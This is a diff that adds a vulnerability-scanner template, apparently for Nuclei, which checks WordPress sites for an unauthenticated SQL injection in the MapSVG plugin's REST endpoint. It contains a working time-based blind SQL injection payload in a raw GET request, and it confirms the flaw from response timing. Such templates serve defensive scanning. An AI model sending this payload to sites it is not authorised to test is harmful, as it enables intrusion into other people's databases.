@@ -1,0 +1,31 @@
+id: mapsvg-sqli
+
+info:
+  name: MapSVG Unauthenticated SQLi
+  author: melbadry9
+  severity: info
+  description: The plugin does not validate and escape a parameter via a REST endpoint before using it in a SQL statement, leading to a SQL Injection exploitable by unauthenticated users.
+  reference: https://wpscan.com/vulnerability/5d8d53ad-dc88-4b50-a292-fc447484c27b
+  tags: wordpress,wp,sqli
+
+requests:
+- raw:
+  - |+
+    GET /wp-json/mapsvg/v1/maps/2?id=1%27%20AND%20(SELECT%2042%20FROM%20(SELECT(SLEEP(4)))b)--+ HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en-US;q=0.9,en;q=0.8
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+    Cache-Control: max-age=0
+    
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - "svgFileLastChanged"
+  
+  - type: dsl
+    dsl:
+    - "duration>=4"
